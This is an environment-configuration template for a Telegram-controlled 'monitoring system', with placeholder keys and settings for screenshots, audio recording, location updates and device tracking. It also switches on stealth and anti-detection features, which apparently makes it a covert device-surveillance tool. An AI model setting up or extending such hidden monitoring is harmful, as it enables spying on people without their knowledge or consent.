# Advanced Monitoring System Configuration
# إعدادات نظام المراقبة المتقدم

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN=your_telegram_bot_token_here
TELEGRAM_BOT_USERNAME=your_bot_username

# API Configuration
API_URL=http://localhost:5000
API_TIMEOUT=30

# Security Configuration
JWT_SECRET=your-secret-key-here-change-this-in-production
JWT_EXPIRATION=3600
ENCRYPTION_KEY=your-fernet-key-here-44-base64-chars-example

# Database Configuration
DATABASE_URL=monitoring_system.db
DATABASE_BACKUP_INTERVAL=3600

# Admin Configuration
ADMIN_USERS=123456789,987654321
DEFAULT_ADMIN_ID=123456789

# Monitoring Configuration
ALERT_CHECK_INTERVAL=60
MAX_ALERT_RETRIES=3
DEVICE_OFFLINE_THRESHOLD=300
LOCATION_UPDATE_INTERVAL=60

# File Upload Configuration
UPLOAD_FOLDER=/tmp/uploads
MAX_FILE_SIZE=50
SCREENSHOT_QUALITY=80
AUDIO_RECORDING_DURATION=30

# Logging Configuration
LOG_LEVEL=INFO
LOG_FILE=monitoring_system.log

# Server Configuration
HOST=0.0.0.0
PORT=5000
DEBUG=False

# Webhook Configuration (optional)
WEBHOOK_URL=
WEBHOOK_PORT=8443

# Performance Configuration
MAX_WORKERS=4
WORKER_TIMEOUT=30
KEEP_ALIVE=2

# Security Features
ENABLE_STEALTH_MODE=True
ENABLE_ENCRYPTION=True
ENABLE_ANTI_DETECTION=True
